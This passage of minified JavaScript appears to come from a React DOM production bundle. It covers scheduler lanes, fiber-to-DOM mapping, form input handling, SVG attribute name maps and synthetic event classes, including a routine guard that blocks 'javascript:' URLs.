          break;
        default:
          if (t = e.tagName, e = e.namespaceURI) e = V1(e), t = Z1(e, t);
          else switch (t) {
            case "svg":
              t = 1;
              break;
            case "math":
              t = 2;
              break;
            default:
              t = 0;
          }
      }
      G(j), Q(j, t);
    }
    function Gt() {
      G(j), G(J), G(ct);
    }
    function Kn(t) {
      t.memoizedState !== null && Q(pt, t);
      var e = j.current, n = Z1(e, t.type);
      e !== n && (Q(J, t), Q(j, n));
    }
    function tn(t) {
      J.current === t && (G(j), G(J)), pt.current === t && (G(pt), wa._currentValue = P);
    }
    var Tl, Vu;
    function En(t) {
      if (Tl === void 0) try {
        throw Error();
      } catch (n) {
        var e = n.stack.trim().match(/\n( *(at )?)/);
        Tl = e && e[1] || "", Vu = -1 < n.stack.indexOf(`
    at`) ? " (<anonymous>)" : -1 < n.stack.indexOf("@") ? "@unknown:0:0" : "";
      }
      return `
` + Tl + t + Vu;
    }
    var $l = false;
    function an(t, e) {
      if (!t || $l) return "";
      $l = true;
      var n = Error.prepareStackTrace;
      Error.prepareStackTrace = void 0;
      try {
        var l = {
          DetermineComponentFrameRoot: function() {
            try {
              if (e) {
                var Y = function() {
                  throw Error();
                };
                if (Object.defineProperty(Y.prototype, "props", {
                  set: function() {
                    throw Error();
                  }
                }), typeof Reflect == "object" && Reflect.construct) {
                  try {
                    Reflect.construct(Y, []);
                  } catch (M) {
                    var D = M;
                  }
                  Reflect.construct(t, [], Y);
                } else {
                  try {
                    Y.call();
                  } catch (M) {
                    D = M;
                  }
                  t.call(Y.prototype);
                }
              } else {
                try {
                  throw Error();
                } catch (M) {
                  D = M;
                }
                (Y = t()) && typeof Y.catch == "function" && Y.catch(function() {
                });
              }
            } catch (M) {
              if (M && D && typeof M.stack == "string") return [
                M.stack,
                D.stack
              ];
            }
            return [
              null,
              null
            ];
          }
        };
        l.DetermineComponentFrameRoot.displayName = "DetermineComponentFrameRoot";
        var a = Object.getOwnPropertyDescriptor(l.DetermineComponentFrameRoot, "name");
        a && a.configurable && Object.defineProperty(l.DetermineComponentFrameRoot, "name", {
          value: "DetermineComponentFrameRoot"
        });
        var i = l.DetermineComponentFrameRoot(), h = i[0], d = i[1];
        if (h && d) {
          var _ = h.split(`
`), R = d.split(`
`);
          for (a = l = 0; l < _.length && !_[l].includes("DetermineComponentFrameRoot"); ) l++;
          for (; a < R.length && !R[a].includes("DetermineComponentFrameRoot"); ) a++;
          if (l === _.length || a === R.length) for (l = _.length - 1, a = R.length - 1; 1 <= l && 0 <= a && _[l] !== R[a]; ) a--;
          for (; 1 <= l && 0 <= a; l--, a--) if (_[l] !== R[a]) {
            if (l !== 1 || a !== 1) do
              if (l--, a--, 0 > a || _[l] !== R[a]) {
                var w = `
` + _[l].replace(" at new ", " at ");
                return t.displayName && w.includes("<anonymous>") && (w = w.replace("<anonymous>", t.displayName)), w;
              }
            while (1 <= l && 0 <= a);
            break;
          }
        }
      } finally {
        $l = false, Error.prepareStackTrace = n;
      }
      return (n = t ? t.displayName || t.name : "") ? En(n) : "";
    }
    function Sl(t, e) {
      switch (t.tag) {
        case 26:
        case 27:
        case 5:
          return En(t.type);
        case 16:
          return En("Lazy");
        case 13:
          return t.child !== e && e !== null ? En("Suspense Fallback") : En("Suspense");
        case 19:
          return En("SuspenseList");
        case 0:
        case 15:
          return an(t.type, false);
        case 11:
          return an(t.type.render, false);
        case 1:
          return an(t.type, true);
        case 31:
          return En("Activity");
        default:
          return "";
      }
    }
    function ka(t) {
      try {
        var e = "", n = null;
        do
          e += Sl(t, n), n = t, t = t.return;
        while (t);
        return e;
      } catch (l) {
        return `
Error generating stack: ` + l.message + `
` + l.stack;
      }
    }
    var Zu = Object.prototype.hasOwnProperty, Ul = u.unstable_scheduleCallback, Iu = u.unstable_cancelCallback, Rf = u.unstable_shouldYield, $a = u.unstable_requestPaint, ne = u.unstable_now, we = u.unstable_getCurrentPriorityLevel, Pl = u.unstable_ImmediatePriority, Pa = u.unstable_UserBlockingPriority, Ue = u.unstable_NormalPriority, Df = u.unstable_LowPriority, y = u.unstable_IdlePriority, o = u.log, s = u.unstable_setDisableYieldValue, g = null, S = null;
    function z(t) {
      if (typeof o == "function" && s(t), S && typeof S.setStrictMode == "function") try {
        S.setStrictMode(g, t);
      } catch {
      }
    }
    var C = Math.clz32 ? Math.clz32 : wt, rt = Math.log, qt = Math.LN2;
    function wt(t) {
      return t >>>= 0, t === 0 ? 32 : 31 - (rt(t) / qt | 0) | 0;
    }
    var Mt = 256, Et = 262144, Wa = 4194304;
    function xl(t) {
      var e = t & 42;
      if (e !== 0) return e;
      switch (t & -t) {
        case 1:
          return 1;
        case 2:
          return 2;
        case 4:
          return 4;
        case 8:
          return 8;
        case 16:
          return 16;
        case 32:
          return 32;
        case 64:
          return 64;
        case 128:
          return 128;
        case 256:
        case 512:
        case 1024:
        case 2048:
        case 4096:
        case 8192:
        case 16384:
        case 32768:
        case 65536:
        case 131072:
          return t & 261888;
        case 262144:
        case 524288:
        case 1048576:
        case 2097152:
          return t & 3932160;
        case 4194304:
        case 8388608:
        case 16777216:
        case 33554432:
          return t & 62914560;
        case 67108864:
          return 67108864;
        case 134217728:
          return 134217728;
        case 268435456:
          return 268435456;
        case 536870912:
          return 536870912;
        case 1073741824:
          return 0;
        default:
          return t;
      }
    }
    function ti(t, e, n) {
      var l = t.pendingLanes;
      if (l === 0) return 0;
      var a = 0, i = t.suspendedLanes, h = t.pingedLanes;
      t = t.warmLanes;
      var d = l & 134217727;
      return d !== 0 ? (l = d & ~i, l !== 0 ? a = xl(l) : (h &= d, h !== 0 ? a = xl(h) : n || (n = d & ~t, n !== 0 && (a = xl(n))))) : (d = l & ~i, d !== 0 ? a = xl(d) : h !== 0 ? a = xl(h) : n || (n = l & ~t, n !== 0 && (a = xl(n)))), a === 0 ? 0 : e !== 0 && e !== a && (e & i) === 0 && (i = a & -a, n = e & -e, i >= n || i === 32 && (n & 4194048) !== 0) ? e : a;
    }
    function Ju(t, e) {
      return (t.pendingLanes & ~(t.suspendedLanes & ~t.pingedLanes) & e) === 0;
    }
    function ry(t, e) {
      switch (t) {
        case 1:
        case 2:
        case 4:
        case 8:
        case 64:
          return e + 250;
        case 16:
        case 32:
        case 128:
        case 256:
        case 512:
        case 1024:
        case 2048:
        case 4096:
        case 8192:
        case 16384:
        case 32768:
        case 65536:
        case 131072:
        case 262144:
        case 524288:
        case 1048576:
        case 2097152:
          return e + 5e3;
        case 4194304:
        case 8388608:
        case 16777216:
        case 33554432:
          return -1;
        case 67108864:
        case 134217728:
        case 268435456:
        case 536870912:
        case 1073741824:
          return -1;
        default:
          return -1;
      }
    }
    function U0() {
      var t = Wa;
      return Wa <<= 1, (Wa & 62914560) === 0 && (Wa = 4194304), t;
    }
    function Bf(t) {
      for (var e = [], n = 0; 31 > n; n++) e.push(t);
      return e;
    }
    function Fu(t, e) {
      t.pendingLanes |= e, e !== 268435456 && (t.suspendedLanes = 0, t.pingedLanes = 0, t.warmLanes = 0);
    }
    function oy(t, e, n, l, a, i) {
      var h = t.pendingLanes;
      t.pendingLanes = n, t.suspendedLanes = 0, t.pingedLanes = 0, t.warmLanes = 0, t.expiredLanes &= n, t.entangledLanes &= n, t.errorRecoveryDisabledLanes &= n, t.shellSuspendCounter = 0;
      var d = t.entanglements, _ = t.expirationTimes, R = t.hiddenUpdates;
      for (n = h & ~n; 0 < n; ) {
        var w = 31 - C(n), Y = 1 << w;
        d[w] = 0, _[w] = -1;
        var D = R[w];
        if (D !== null) for (R[w] = null, w = 0; w < D.length; w++) {
          var M = D[w];
          M !== null && (M.lane &= -536870913);
        }
        n &= ~Y;
      }
      l !== 0 && x0(t, l, 0), i !== 0 && a === 0 && t.tag !== 0 && (t.suspendedLanes |= i & ~(h & ~e));
    }
    function x0(t, e, n) {
      t.pendingLanes |= e, t.suspendedLanes &= ~e;
      var l = 31 - C(e);
      t.entangledLanes |= e, t.entanglements[l] = t.entanglements[l] | 1073741824 | n & 261930;
    }
    function O0(t, e) {
      var n = t.entangledLanes |= e;
      for (t = t.entanglements; n; ) {
        var l = 31 - C(n), a = 1 << l;
        a & e | t[l] & e && (t[l] |= e), n &= ~a;
      }
    }
    function N0(t, e) {
      var n = e & -e;
      return n = (n & 42) !== 0 ? 1 : zf(n), (n & (t.suspendedLanes | e)) !== 0 ? 0 : n;
    }
    function zf(t) {
      switch (t) {
        case 2:
          t = 1;
          break;
        case 8:
          t = 4;
          break;
        case 32:
          t = 16;
          break;
        case 256:
        case 512:
        case 1024:
        case 2048:
        case 4096:
        case 8192:
        case 16384:
        case 32768:
        case 65536:
        case 131072:
        case 262144:
        case 524288:
        case 1048576:
        case 2097152:
        case 4194304:
        case 8388608:
        case 16777216:
        case 33554432:
          t = 128;
          break;
        case 268435456:
          t = 134217728;
          break;
        default:
          t = 0;
      }
      return t;
    }
    function Mf(t) {
      return t &= -t, 2 < t ? 8 < t ? (t & 134217727) !== 0 ? 32 : 268435456 : 8 : 2;
    }
    function R0() {
      var t = K.p;
      return t !== 0 ? t : (t = window.event, t === void 0 ? 32 : mh(t.type));
    }
    function D0(t, e) {
      var n = K.p;
      try {
        return K.p = t, e();
      } finally {
        K.p = n;
      }
    }
    var Qn = Math.random().toString(36).slice(2), ie = "__reactFiber$" + Qn, ge = "__reactProps$" + Qn, Wl = "__reactContainer$" + Qn, Cf = "__reactEvents$" + Qn, sy = "__reactListeners$" + Qn, hy = "__reactHandles$" + Qn, B0 = "__reactResources$" + Qn, ku = "__reactMarker$" + Qn;
    function wf(t) {
      delete t[ie], delete t[ge], delete t[Cf], delete t[sy], delete t[hy];
    }
    function tu(t) {
      var e = t[ie];
      if (e) return e;
      for (var n = t.parentNode; n; ) {
        if (e = n[Wl] || n[ie]) {
          if (n = e.alternate, e.child !== null || n !== null && n.child !== null) for (t = W1(t); t !== null; ) {
            if (n = t[ie]) return n;
            t = W1(t);
          }
          return e;
        }
        t = n, n = t.parentNode;
      }
      return null;
    }
    function eu(t) {
      if (t = t[ie] || t[Wl]) {
        var e = t.tag;
        if (e === 5 || e === 6 || e === 13 || e === 31 || e === 26 || e === 27 || e === 3) return t;
      }
      return null;
    }
    function $u(t) {
      var e = t.tag;
      if (e === 5 || e === 26 || e === 27 || e === 6) return t.stateNode;
      throw Error(c(33));
    }
    function nu(t) {
      var e = t[B0];
      return e || (e = t[B0] = {
        hoistableStyles: /* @__PURE__ */ new Map(),
        hoistableScripts: /* @__PURE__ */ new Map()
      }), e;
    }
    function le(t) {
      t[ku] = true;
    }
    var z0 = /* @__PURE__ */ new Set(), M0 = {};
    function Ol(t, e) {
      lu(t, e), lu(t + "Capture", e);
    }
    function lu(t, e) {
      for (M0[t] = e, t = 0; t < e.length; t++) z0.add(e[t]);
    }
    var dy = RegExp("^[:A-Z_a-z\\u00C0-\\u00D6\\u00D8-\\u00F6\\u00F8-\\u02FF\\u0370-\\u037D\\u037F-\\u1FFF\\u200C-\\u200D\\u2070-\\u218F\\u2C00-\\u2FEF\\u3001-\\uD7FF\\uF900-\\uFDCF\\uFDF0-\\uFFFD][:A-Z_a-z\\u00C0-\\u00D6\\u00D8-\\u00F6\\u00F8-\\u02FF\\u0370-\\u037D\\u037F-\\u1FFF\\u200C-\\u200D\\u2070-\\u218F\\u2C00-\\u2FEF\\u3001-\\uD7FF\\uF900-\\uFDCF\\uFDF0-\\uFFFD\\-.0-9\\u00B7\\u0300-\\u036F\\u203F-\\u2040]*$"), C0 = {}, w0 = {};
    function yy(t) {
      return Zu.call(w0, t) ? true : Zu.call(C0, t) ? false : dy.test(t) ? w0[t] = true : (C0[t] = true, false);
    }
    function ei(t, e, n) {
      if (yy(e)) if (n === null) t.removeAttribute(e);
      else {
        switch (typeof n) {
          case "undefined":
          case "function":
          case "symbol":
            t.removeAttribute(e);
            return;
          case "boolean":
            var l = e.toLowerCase().slice(0, 5);
            if (l !== "data-" && l !== "aria-") {
              t.removeAttribute(e);
              return;
            }
        }
        t.setAttribute(e, "" + n);
      }
    }
    function ni(t, e, n) {
      if (n === null) t.removeAttribute(e);
      else {
        switch (typeof n) {
          case "undefined":
          case "function":
          case "symbol":
          case "boolean":
            t.removeAttribute(e);
            return;
        }
        t.setAttribute(e, "" + n);
      }
    }
    function bn(t, e, n, l) {
      if (l === null) t.removeAttribute(n);
      else {
        switch (typeof l) {
          case "undefined":
          case "function":
          case "symbol":
          case "boolean":
            t.removeAttribute(n);
            return;
        }
        t.setAttributeNS(e, n, "" + l);
      }
    }
    function He(t) {
      switch (typeof t) {
        case "bigint":
        case "boolean":
        case "number":
        case "string":
        case "undefined":
          return t;
        case "object":
          return t;
        default:
          return "";
      }
    }
    function H0(t) {
      var e = t.type;
      return (t = t.nodeName) && t.toLowerCase() === "input" && (e === "checkbox" || e === "radio");
    }
    function my(t, e, n) {
      var l = Object.getOwnPropertyDescriptor(t.constructor.prototype, e);
      if (!t.hasOwnProperty(e) && typeof l < "u" && typeof l.get == "function" && typeof l.set == "function") {
        var a = l.get, i = l.set;
        return Object.defineProperty(t, e, {
          configurable: true,
          get: function() {
            return a.call(this);
          },
          set: function(h) {
            n = "" + h, i.call(this, h);
          }
        }), Object.defineProperty(t, e, {
          enumerable: l.enumerable
        }), {
          getValue: function() {
            return n;
          },
          setValue: function(h) {
            n = "" + h;
          },
          stopTracking: function() {
            t._valueTracker = null, delete t[e];
          }
        };
      }
    }
    function Hf(t) {
      if (!t._valueTracker) {
        var e = H0(t) ? "checked" : "value";
        t._valueTracker = my(t, e, "" + t[e]);
      }
    }
    function L0(t) {
      if (!t) return false;
      var e = t._valueTracker;
      if (!e) return true;
      var n = e.getValue(), l = "";
      return t && (l = H0(t) ? t.checked ? "true" : "false" : t.value), t = l, t !== n ? (e.setValue(t), true) : false;
    }
    function li(t) {
      if (t = t || (typeof document < "u" ? document : void 0), typeof t > "u") return null;
      try {
        return t.activeElement || t.body;
      } catch {
        return t.body;
      }
    }
    var gy = /[\n"\\]/g;
    function Le(t) {
      return t.replace(gy, function(e) {
        return "\\" + e.charCodeAt(0).toString(16) + " ";
      });
    }
    function Lf(t, e, n, l, a, i, h, d) {
      t.name = "", h != null && typeof h != "function" && typeof h != "symbol" && typeof h != "boolean" ? t.type = h : t.removeAttribute("type"), e != null ? h === "number" ? (e === 0 && t.value === "" || t.value != e) && (t.value = "" + He(e)) : t.value !== "" + He(e) && (t.value = "" + He(e)) : h !== "submit" && h !== "reset" || t.removeAttribute("value"), e != null ? Yf(t, h, He(e)) : n != null ? Yf(t, h, He(n)) : l != null && t.removeAttribute("value"), a == null && i != null && (t.defaultChecked = !!i), a != null && (t.checked = a && typeof a != "function" && typeof a != "symbol"), d != null && typeof d != "function" && typeof d != "symbol" && typeof d != "boolean" ? t.name = "" + He(d) : t.removeAttribute("name");
    }
    function Y0(t, e, n, l, a, i, h, d) {
      if (i != null && typeof i != "function" && typeof i != "symbol" && typeof i != "boolean" && (t.type = i), e != null || n != null) {
        if (!(i !== "submit" && i !== "reset" || e != null)) {
          Hf(t);
          return;
        }
        n = n != null ? "" + He(n) : "", e = e != null ? "" + He(e) : n, d || e === t.value || (t.value = e), t.defaultValue = e;
      }
      l = l ?? a, l = typeof l != "function" && typeof l != "symbol" && !!l, t.checked = d ? t.checked : !!l, t.defaultChecked = !!l, h != null && typeof h != "function" && typeof h != "symbol" && typeof h != "boolean" && (t.name = h), Hf(t);
    }
    function Yf(t, e, n) {
      e === "number" && li(t.ownerDocument) === t || t.defaultValue === "" + n || (t.defaultValue = "" + n);
    }
    function uu(t, e, n, l) {
      if (t = t.options, e) {
        e = {};
        for (var a = 0; a < n.length; a++) e["$" + n[a]] = true;
        for (n = 0; n < t.length; n++) a = e.hasOwnProperty("$" + t[n].value), t[n].selected !== a && (t[n].selected = a), a && l && (t[n].defaultSelected = true);
      } else {
        for (n = "" + He(n), e = null, a = 0; a < t.length; a++) {
          if (t[a].value === n) {
            t[a].selected = true, l && (t[a].defaultSelected = true);
            return;
          }
          e !== null || t[a].disabled || (e = t[a]);
        }
        e !== null && (e.selected = true);
      }
    }
    function G0(t, e, n) {
      if (e != null && (e = "" + He(e), e !== t.value && (t.value = e), n == null)) {
        t.defaultValue !== e && (t.defaultValue = e);
        return;
      }
      t.defaultValue = n != null ? "" + He(n) : "";
    }
    function q0(t, e, n, l) {
      if (e == null) {
        if (l != null) {
          if (n != null) throw Error(c(92));
          if (Se(l)) {
            if (1 < l.length) throw Error(c(93));
            l = l[0];
          }
          n = l;
        }
        n == null && (n = ""), e = n;
      }
      n = He(e), t.defaultValue = n, l = t.textContent, l === n && l !== "" && l !== null && (t.value = l), Hf(t);
    }
    function au(t, e) {
      if (e) {
        var n = t.firstChild;
        if (n && n === t.lastChild && n.nodeType === 3) {
          n.nodeValue = e;
          return;
        }
      }
      t.textContent = e;
    }
    var vy = new Set("animationIterationCount aspectRatio borderImageOutset borderImageSlice borderImageWidth boxFlex boxFlexGroup boxOrdinalGroup columnCount columns flex flexGrow flexPositive flexShrink flexNegative flexOrder gridArea gridRow gridRowEnd gridRowSpan gridRowStart gridColumn gridColumnEnd gridColumnSpan gridColumnStart fontWeight lineClamp lineHeight opacity order orphans scale tabSize widows zIndex zoom fillOpacity floodOpacity stopOpacity strokeDasharray strokeDashoffset strokeMiterlimit strokeOpacity strokeWidth MozAnimationIterationCount MozBoxFlex MozBoxFlexGroup MozLineClamp msAnimationIterationCount msFlex msZoom msFlexGrow msFlexNegative msFlexOrder msFlexPositive msFlexShrink msGridColumn msGridColumnSpan msGridRow msGridRowSpan WebkitAnimationIterationCount WebkitBoxFlex WebKitBoxFlexGroup WebkitBoxOrdinalGroup WebkitColumnCount WebkitColumns WebkitFlex WebkitFlexGrow WebkitFlexPositive WebkitFlexShrink WebkitLineClamp".split(" "));
    function j0(t, e, n) {
      var l = e.indexOf("--") === 0;
      n == null || typeof n == "boolean" || n === "" ? l ? t.setProperty(e, "") : e === "float" ? t.cssFloat = "" : t[e] = "" : l ? t.setProperty(e, n) : typeof n != "number" || n === 0 || vy.has(e) ? e === "float" ? t.cssFloat = n : t[e] = ("" + n).trim() : t[e] = n + "px";
    }
    function X0(t, e, n) {
      if (e != null && typeof e != "object") throw Error(c(62));
      if (t = t.style, n != null) {
        for (var l in n) !n.hasOwnProperty(l) || e != null && e.hasOwnProperty(l) || (l.indexOf("--") === 0 ? t.setProperty(l, "") : l === "float" ? t.cssFloat = "" : t[l] = "");
        for (var a in e) l = e[a], e.hasOwnProperty(a) && n[a] !== l && j0(t, a, l);
      } else for (var i in e) e.hasOwnProperty(i) && j0(t, i, e[i]);
    }
    function Gf(t) {
      if (t.indexOf("-") === -1) return false;
      switch (t) {
        case "annotation-xml":
        case "color-profile":
        case "font-face":
        case "font-face-src":
        case "font-face-uri":
        case "font-face-format":
        case "font-face-name":
        case "missing-glyph":
          return false;
        default:
          return true;
      }
    }
    var py = /* @__PURE__ */ new Map([
      [
        "acceptCharset",
        "accept-charset"
      ],
      [
        "htmlFor",
        "for"
      ],
      [
        "httpEquiv",
        "http-equiv"
      ],
      [
        "crossOrigin",
        "crossorigin"
      ],
      [
        "accentHeight",
        "accent-height"
      ],
      [
        "alignmentBaseline",
        "alignment-baseline"
      ],
      [
        "arabicForm",
        "arabic-form"
      ],
      [
        "baselineShift",
        "baseline-shift"
      ],
      [
        "capHeight",
        "cap-height"
      ],
      [
        "clipPath",
        "clip-path"
      ],
      [
        "clipRule",
        "clip-rule"
      ],
      [
        "colorInterpolation",
        "color-interpolation"
      ],
      [
        "colorInterpolationFilters",
        "color-interpolation-filters"
      ],
      [
        "colorProfile",
        "color-profile"
      ],
      [
        "colorRendering",
        "color-rendering"
      ],
      [
        "dominantBaseline",
        "dominant-baseline"
      ],
      [
        "enableBackground",
        "enable-background"
      ],
      [
        "fillOpacity",
        "fill-opacity"
      ],
      [
        "fillRule",
        "fill-rule"
      ],
      [
        "floodColor",
        "flood-color"
      ],
      [
        "floodOpacity",
        "flood-opacity"
      ],
      [
        "fontFamily",
        "font-family"
      ],
      [
        "fontSize",
        "font-size"
      ],
      [
        "fontSizeAdjust",
        "font-size-adjust"
      ],
      [
        "fontStretch",
        "font-stretch"
      ],
      [
        "fontStyle",
        "font-style"
      ],
      [
        "fontVariant",
        "font-variant"
      ],
      [
        "fontWeight",
        "font-weight"
      ],
      [
        "glyphName",
        "glyph-name"
      ],
      [
        "glyphOrientationHorizontal",
        "glyph-orientation-horizontal"
      ],
      [
        "glyphOrientationVertical",
        "glyph-orientation-vertical"
      ],
      [
        "horizAdvX",
        "horiz-adv-x"
      ],
      [
        "horizOriginX",
        "horiz-origin-x"
      ],
      [
        "imageRendering",
        "image-rendering"
      ],
      [
        "letterSpacing",
        "letter-spacing"
      ],
      [
        "lightingColor",
        "lighting-color"
      ],
      [
        "markerEnd",
        "marker-end"
      ],
      [
        "markerMid",
        "marker-mid"
      ],
      [
        "markerStart",
        "marker-start"
      ],
      [
        "overlinePosition",
        "overline-position"
      ],
      [
        "overlineThickness",
        "overline-thickness"
      ],
      [
        "paintOrder",
        "paint-order"
      ],
      [
        "panose-1",
        "panose-1"
      ],
      [
        "pointerEvents",
        "pointer-events"
      ],
      [
        "renderingIntent",
        "rendering-intent"
      ],
      [
        "shapeRendering",
        "shape-rendering"
      ],
      [
        "stopColor",
        "stop-color"
      ],
      [
        "stopOpacity",
        "stop-opacity"
      ],
      [
        "strikethroughPosition",
        "strikethrough-position"
      ],
      [
        "strikethroughThickness",
        "strikethrough-thickness"
      ],
      [
        "strokeDasharray",
        "stroke-dasharray"
      ],
      [
        "strokeDashoffset",
        "stroke-dashoffset"
      ],
      [
        "strokeLinecap",
        "stroke-linecap"
      ],
      [
        "strokeLinejoin",
        "stroke-linejoin"
      ],
      [
        "strokeMiterlimit",
        "stroke-miterlimit"
      ],
      [
        "strokeOpacity",
        "stroke-opacity"
      ],
      [
        "strokeWidth",
        "stroke-width"
      ],
      [
        "textAnchor",
        "text-anchor"
      ],
      [
        "textDecoration",
        "text-decoration"
      ],
      [
        "textRendering",
        "text-rendering"
      ],
      [
        "transformOrigin",
        "transform-origin"
      ],
      [
        "underlinePosition",
        "underline-position"
      ],
      [
        "underlineThickness",
        "underline-thickness"
      ],
      [
        "unicodeBidi",
        "unicode-bidi"
      ],
      [
        "unicodeRange",
        "unicode-range"
      ],
      [
        "unitsPerEm",
        "units-per-em"
      ],
      [
        "vAlphabetic",
        "v-alphabetic"
      ],
      [
        "vHanging",
        "v-hanging"
      ],
      [
        "vIdeographic",
        "v-ideographic"
      ],
      [
        "vMathematical",
        "v-mathematical"
      ],
      [
        "vectorEffect",
        "vector-effect"
      ],
      [
        "vertAdvY",
        "vert-adv-y"
      ],
      [
        "vertOriginX",
        "vert-origin-x"
      ],
      [
        "vertOriginY",
        "vert-origin-y"
      ],
      [
        "wordSpacing",
        "word-spacing"
      ],
      [
        "writingMode",
        "writing-mode"
      ],
      [
        "xmlnsXlink",
        "xmlns:xlink"
      ],
      [
        "xHeight",
        "x-height"
      ]
    ]), Ey = /^[\u0000-\u001F ]*j[\r\n\t]*a[\r\n\t]*v[\r\n\t]*a[\r\n\t]*s[\r\n\t]*c[\r\n\t]*r[\r\n\t]*i[\r\n\t]*p[\r\n\t]*t[\r\n\t]*:/i;
    function ui(t) {
      return Ey.test("" + t) ? "javascript:throw new Error('React has blocked a javascript: URL as a security precaution.')" : t;
    }
    function _n() {
    }
    var qf = null;
    function jf(t) {
      return t = t.target || t.srcElement || window, t.correspondingUseElement && (t = t.correspondingUseElement), t.nodeType === 3 ? t.parentNode : t;
    }
    var iu = null, fu = null;
    function K0(t) {
      var e = eu(t);
      if (e && (t = e.stateNode)) {
        var n = t[ge] || null;
        t: switch (t = e.stateNode, e.type) {
          case "input":
            if (Lf(t, n.value, n.defaultValue, n.defaultValue, n.checked, n.defaultChecked, n.type, n.name), e = n.name, n.type === "radio" && e != null) {
              for (n = t; n.parentNode; ) n = n.parentNode;
              for (n = n.querySelectorAll('input[name="' + Le("" + e) + '"][type="radio"]'), e = 0; e < n.length; e++) {
                var l = n[e];
                if (l !== t && l.form === t.form) {
                  var a = l[ge] || null;
                  if (!a) throw Error(c(90));
                  Lf(l, a.value, a.defaultValue, a.defaultValue, a.checked, a.defaultChecked, a.type, a.name);
                }
              }
              for (e = 0; e < n.length; e++) l = n[e], l.form === t.form && L0(l);
            }
            break t;
          case "textarea":
            G0(t, n.value, n.defaultValue);
            break t;
          case "select":
            e = n.value, e != null && uu(t, !!n.multiple, e, false);
        }
      }
    }
    var Xf = false;
    function Q0(t, e, n) {
      if (Xf) return t(e, n);
      Xf = true;
      try {
        var l = t(e);
        return l;
      } finally {
        if (Xf = false, (iu !== null || fu !== null) && (Vi(), iu && (e = iu, t = fu, fu = iu = null, K0(e), t))) for (e = 0; e < t.length; e++) K0(t[e]);
      }
    }
    function Pu(t, e) {
      var n = t.stateNode;
      if (n === null) return null;
      var l = n[ge] || null;
      if (l === null) return null;
      n = l[e];
      t: switch (e) {
        case "onClick":
        case "onClickCapture":
        case "onDoubleClick":
        case "onDoubleClickCapture":
        case "onMouseDown":
        case "onMouseDownCapture":
        case "onMouseMove":
        case "onMouseMoveCapture":
        case "onMouseUp":
        case "onMouseUpCapture":
        case "onMouseEnter":
          (l = !l.disabled) || (t = t.type, l = !(t === "button" || t === "input" || t === "select" || t === "textarea")), t = !l;
          break t;
        default:
          t = false;
      }
      if (t) return null;
      if (n && typeof n != "function") throw Error(c(231, e, typeof n));
      return n;
    }
    var An = !(typeof window > "u" || typeof window.document > "u" || typeof window.document.createElement > "u"), Kf = false;
    if (An) try {
      var Wu = {};
      Object.defineProperty(Wu, "passive", {
        get: function() {
          Kf = true;
        }
      }), window.addEventListener("test", Wu, Wu), window.removeEventListener("test", Wu, Wu);
    } catch {
      Kf = false;
    }
    var Vn = null, Qf = null, ai = null;
    function V0() {
      if (ai) return ai;
      var t, e = Qf, n = e.length, l, a = "value" in Vn ? Vn.value : Vn.textContent, i = a.length;
      for (t = 0; t < n && e[t] === a[t]; t++) ;
      var h = n - t;
      for (l = 1; l <= h && e[n - l] === a[i - l]; l++) ;
      return ai = a.slice(t, 1 < l ? 1 - l : void 0);
    }
    function ii(t) {
      var e = t.keyCode;
      return "charCode" in t ? (t = t.charCode, t === 0 && e === 13 && (t = 13)) : t = e, t === 10 && (t = 13), 32 <= t || t === 13 ? t : 0;
    }
    function fi() {
      return true;
    }
    function Z0() {
      return false;
    }
    function ve(t) {
      function e(n, l, a, i, h) {
        this._reactName = n, this._targetInst = a, this.type = l, this.nativeEvent = i, this.target = h, this.currentTarget = null;
        for (var d in t) t.hasOwnProperty(d) && (n = t[d], this[d] = n ? n(i) : i[d]);
        return this.isDefaultPrevented = (i.defaultPrevented != null ? i.defaultPrevented : i.returnValue === false) ? fi : Z0, this.isPropagationStopped = Z0, this;
      }
      return B(e.prototype, {
        preventDefault: function() {
          this.defaultPrevented = true;
          var n = this.nativeEvent;
          n && (n.preventDefault ? n.preventDefault() : typeof n.returnValue != "unknown" && (n.returnValue = false), this.isDefaultPrevented = fi);
        },
        stopPropagation: function() {
          var n = this.nativeEvent;
          n && (n.stopPropagation ? n.stopPropagation() : typeof n.cancelBubble != "unknown" && (n.cancelBubble = true), this.isPropagationStopped = fi);
        },
        persist: function() {
        },
        isPersistent: fi
      }), e;
    }
    var Nl = {
      eventPhase: 0,
      bubbles: 0,
      cancelable: 0,
      timeStamp: function(t) {
        return t.timeStamp || Date.now();
      },
      defaultPrevented: 0,
      isTrusted: 0
    }, ci = ve(Nl), ta = B({}, Nl, {
      view: 0,
      detail: 0
    }), by = ve(ta), Vf, Zf, ea, ri = B({}, ta, {
      screenX: 0,
      screenY: 0,
      clientX: 0,
      clientY: 0,
      pageX: 0,
      pageY: 0,
      ctrlKey: 0,
      shiftKey: 0,
      altKey: 0,
      metaKey: 0,
      getModifierState: Jf,
      button: 0,
      buttons: 0,
      relatedTarget: function(t) {
        return t.relatedTarget === void 0 ? t.fromElement === t.srcElement ? t.toElement : t.fromElement : t.relatedTarget;
      },
      movementX: function(t) {
        return "movementX" in t ? t.movementX : (t !== ea && (ea && t.type === "mousemove" ? (Vf = t.screenX - ea.screenX, Zf = t.screenY - ea.screenY) : Zf = Vf = 0, ea = t), Vf);
      },
      movementY: function(t) {
        return "movementY" in t ? t.movementY : Zf;
      }
    }), I0 = ve(ri), _y = B({}, ri, {
      dataTransfer: 0
    }), Ay = ve(_y), Ty = B({}, ta, {
      relatedTarget: 0
    }), If = ve(Ty), Sy = B({}, Nl, {
      animationName: 0,
      elapsedTime: 0,
      pseudoElement: 0
    }), Uy = ve(Sy), xy = B({}, Nl, {
      clipboardData: function(t) {
        return "clipboardData" in t ? t.clipboardData : window.clipboardData;
      }
    }), Oy = ve(xy), Ny = B({}, Nl, {
      data: 0
    }), J0 = ve(Ny), Ry = {
      Esc: "Escape",
      Spacebar: " ",
      Left: "ArrowLeft",
      Up: "ArrowUp",
      Right: "ArrowRight",
      Down: "ArrowDown",
      Del: "Delete",
      Win: "OS",
      Menu: "ContextMenu",
      Apps: "ContextMenu",
      Scroll: "ScrollLock",
      MozPrintableKey: "Unidentified"
    }, Dy = {
      8: "Backspace",
      9: "Tab",
      12: "Clear",
      13: "Enter",
      16: "Shift",
      17: "Control",
      18: "Alt",
      19: "Pause",
      20: "CapsLock",
      27: "Escape",
      32: " ",
      33: "PageUp",
      34: "PageDown",
      35: "End",
      36: "Home",
      37: "ArrowLeft",
      38: "ArrowUp",
      39: "ArrowRight",
      40: "ArrowDown",
      45: "Insert",
      46: "Delete",
      112: "F1",
      113: "F2",
      114: "F3",
      115: "F4",
      116: "F5",
      117: "F6",
      118: "F7",
      119: "F8",
      120: "F9",
